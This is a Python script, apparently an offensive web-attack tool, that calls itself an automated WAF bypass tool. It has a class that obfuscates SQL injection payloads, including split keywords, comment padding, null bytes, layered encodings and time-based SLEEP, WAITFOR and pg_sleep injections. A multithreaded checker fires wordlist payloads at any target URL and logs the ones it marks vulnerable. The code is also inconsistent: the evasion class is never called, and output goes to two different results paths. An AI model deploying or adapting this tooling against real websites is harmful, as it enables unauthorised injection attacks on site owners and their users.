#!/usr/bin/env python3
import threading
import argparse
import sys
import os
import time
import random
import requests
import urllib.parse
import base64
import string
import datetime
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

class WAFBypassEngine:
    @staticmethod
    def generate_evasion(payload):
        techniques = [
            WAFBypassEngine._multi_layer_encoding,
            WAFBypassEngine._keyword_fragmentation,
            WAFBypassEngine._comment_obfuscation,
            WAFBypassEngine._case_permutation,
            WAFBypassEngine._null_byte_injection,
            WAFBypassEngine._unicode_normalization,
            WAFBypassEngine._time_based_evasion,
            WAFBypassEngine._alternative_syntax
        ]
        for _ in range(random.randint(3, 5)):
            payload = random.choice(techniques)(payload)
        return payload

    @staticmethod
    def _multi_layer_encoding(payload):
        encodings = [
            lambda x: urllib.parse.quote_plus(x),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            lambda x: ''.join([f'\\u{ord(c):04x}' for c in x])
        ]
        return random.choice(encodings)(payload)

    @staticmethod
    def _keyword_fragmentation(payload):
        fragments = {
            'SELECT': ['SEL/**/ECT', 'SELE%0bCT', '/*!SELECT*/'],
            'UNION': ['UNI\x0aON', 'UNI%a0ON', 'UNI' + chr(0x0d) + 'ON'],
            'OR': ['O%%R', 'O\x0aR', '/*!OR*/'],
            'AND': ['%26%26', 'AN%%44', 'A%00ND']
        }
        for key in fragments:
            payload = payload.replace(key, random.choice(fragments[key]))
        return payload

    @staticmethod
    def _comment_obfuscation(payload):
        comments = [
            ('/*{}*/', string.printable),
            ('#{}', '\x0a\x0d'),
            ('-- {}', '\x00\x1a'),
            ('/*!{}*/', '0123456789')
        ]
        comment, chars = random.choice(comments)
        junk = ''.join(random.choice(chars) for _ in range(random.randint(2, 5)))
        return payload.replace(' ', comment.format(junk))

    @staticmethod
    def _case_permutation(payload):
        return ''.join(c.upper() if random.random() > 0.5 and i % 2 == 0 else c.lower() if random.random() > 0.5 else c for i, c in enumerate(payload))

    @staticmethod
    def _null_byte_injection(payload):
        if len(payload) < 4:
            return payload
        pos = random.randint(1, len(payload)-2)
        return payload[:pos] + '%00' + payload[pos:]

    @staticmethod
    def _unicode_normalization(payload):
        return ''.join(f'%u{ord(c):04x}' if random.random() > 0.7 else c for c in payload)

    @staticmethod
    def _time_based_evasion(payload):
        delays = [
            (f' AND SLEEP({random.randint(2, 5)})', 0.8),
            (f";WAITFOR DELAY '0:0:{random.randint(3, 7)}'--", 0.6),
            (f'||pg_sleep({random.randint(3, 6)})--', 0.5)
        ]
        delay, prob = random.choice(delays)
        return payload + delay if random.random() < prob else payload

    @staticmethod
    def _alternative_syntax(payload):
        syntax = [
            ('=', [' LIKE ', ' BETWEEN 0 AND ', ' IN (', '%3D']),
            ("'", ["%27", "%ef%bc%87", "'%20"]),
            (' ', ['%09', '%0a', '%0d', '%0c', '%0b', '/**/'])
        ]
        for char, replacements in syntax:
            if char in payload:
                replacement = random.choice(replacements)
                payload = payload.replace(char, replacement)
        return payload

class WAFChecker:
    def __init__(self, target_url, wordlist, threads=10):
        self.target_url = target_url
        self.wordlist = wordlist
        self.threads = threads
        self.found_payloads = []

    def check_payload(self, payload):
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            response = requests.get(self.target_url, params={'q': payload}, headers=headers, timeout=10)
            if response.status_code == 200 and payload in response.text:
                self.found_payloads.append(payload)
                print(f"{Fore.GREEN}[SUCCESS] Payload found: {payload}")
                # Simpan URL yang rentan ke dalam file berdasarkan tanggal
                self.save_vulnerable_url(payload)
            else:
                print(f"{Fore.RED}[FAILED] Payload not found: {payload}")
        except requests.RequestException as e:
            print(f"{Fore.YELLOW}[ERROR] Request failed for {payload}: {e}")

    def save_vulnerable_url(self, payload):
        current_date = datetime.datetime.now().strftime("%Y-%m-%d")
        result_file = f"/results/vuln-{current_date}.txt"
        # Simpan hanya URL target
        with open(result_file, 'a') as file:
            file.write(f"{self.target_url}\n")

    def run_checks(self):
        print(f"{Fore.CYAN}[INFO] Starting WAF bypass checks on {self.target_url}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for payload in self.wordlist:
                executor.submit(self.check_payload, payload)

    def print_results(self):
        if self.found_payloads:
            print(f"{Fore.BLUE}[RESULTS] Found the following working payloads:")
            for payload in self.found_payloads:
                print(payload)
        else:
            print(f"{Fore.RED}[RESULTS] No working payloads found.")

def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Wordlist file {file_path} not found.")
        sys.exit(1)

def main():
        parser = argparse.ArgumentParser(description="Automated WAF Bypass Tool")
        parser.add_argument("-u", "--url", required=True, help="Target URL")
        parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
        parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use")
        args = parser.parse_args()

        wordlist = load_wordlist(args.wordlist)
        waf_checker = WAFChecker(args.url, wordlist, threads=args.threads)
        waf_checker.run_checks()
        waf_checker.print_results()

        # Menyimpan URL yang rentan ke file berdasarkan tanggal
        if waf_checker.found_payloads:
            date_str = datetime.datetime.now().strftime("%Y-%m-%d")
            result_file = f"results/vuln-{date_str}.txt"

            if not os.path.exists('results'):
                os.makedirs('results')  # Membuat direktori jika belum ada

            with open(result_file, 'a') as f:
                for payload in waf_checker.found_payloads:
                    # Menyimpan URL lengkap (termasuk parameter query)
                    f.write(f"{args.url}\n")
                print(f"{Fore.GREEN}[INFO] Vulnerable URLs saved to {result_file}")
        else:
            print(f"{Fore.RED}[INFO] No vulnerabilities found.")

if __name__ == "__main__":
    main()
